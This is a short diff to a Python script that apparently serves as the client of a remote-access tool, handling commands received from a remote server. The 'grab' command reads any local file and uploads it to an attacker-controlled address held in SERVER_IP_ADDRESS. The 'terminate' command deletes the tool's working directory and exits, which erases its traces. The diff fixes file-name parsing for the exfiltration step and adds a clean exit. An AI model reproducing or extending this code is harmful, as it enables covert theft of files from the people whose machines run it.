@@ -42,13 +42,17 @@ while True:
         try:
             if 'terminate' == response.strip().lower():
                 shutil.rmtree(save)
+                quit()
                 break
 
             elif 'grab' in response and response.startswith('grab'):
                 path = response[5:]
 
                 if os.path.exists(path):
-                    fileName = path.split("\\")[-1]
+                    if '\\' in path:
+                        fileName = path.split("\\")[-1]
+                    else:
+                        fileName = path
                     url = SERVER_IP_ADDRESS + 'store'
                     fo = open(path, 'rb')
                     files = {'file': fo}
